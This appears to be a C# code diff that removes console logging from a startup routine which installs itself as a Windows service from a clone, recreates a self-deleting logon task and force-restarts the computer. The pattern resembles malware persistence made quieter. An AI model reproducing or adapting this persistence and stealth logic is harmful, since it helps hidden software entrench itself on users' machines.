@@ -102,7 +102,6 @@ namespace zort
         {
             if (PookieHelper.PookieMutex.Exists()) //also creates the mutex
             {
-                Console.WriteLine("Pookie mutex exists, exiting.");
                 Exit();
             }
 
@@ -111,47 +110,20 @@ namespace zort
             {
                 if (ServiceHelper.IsServiceInstalled())
                 {
-                    Console.WriteLine("Service is installed.");
-                    if (!ServiceHelper.IsServiceRunning())
-                    {
-                        Console.WriteLine("Service is not running. Starting service...");
-                        ServiceHelper.StartService();
-                    }
-                    else
-                    {
-                        Console.WriteLine("Service is already running.");
-                    }
+                    if (!ServiceHelper.IsServiceRunning()) ServiceHelper.StartService();
                     PookieHelper.PookieMutex.Release();
-                    Console.WriteLine("Pookie mutex released. Exiting...");
                     Exit();
                     return;
                 }
 
-                Console.WriteLine("Service is not installed. Creating clone...");
                 string clonePath = ServiceHelper.CreateItITClone();
-                Console.WriteLine($"Clone created at path: {clonePath}. Installing service...");
                 ServiceHelper.InstallService(clonePath);
-                Console.WriteLine("Service installed successfully.");
                 PookieHelper.PookieMutex.Release();
-                Console.WriteLine("Pookie mutex released.");
 
-                if (PookieHelper.Tasks.StartAtLogon.Exists())
-                {
-                    Console.WriteLine("StartAtLogon task exists. Removing...");
-                    PookieHelper.Tasks.StartAtLogon.Remove();
-                }
-
-                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists())
-                {
-                    Console.WriteLine("DeletePookieAtNextLogon task exists. Removing...");
-                    PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
-                }
-
-                Console.WriteLine("Creating DeletePookieAtNextLogon task...");
+                if (PookieHelper.Tasks.StartAtLogon.Exists()) PookieHelper.Tasks.StartAtLogon.Remove();
+                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists()) PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
                 PookieHelper.Tasks.DeletePookieAtNextLogon.Create();
-                Console.WriteLine("Task created successfully. Restarting computer...");
                 Util.RestartComputer();
-                Console.WriteLine("Restart initiated. Exiting...");
                 Exit();
                 return;
             }
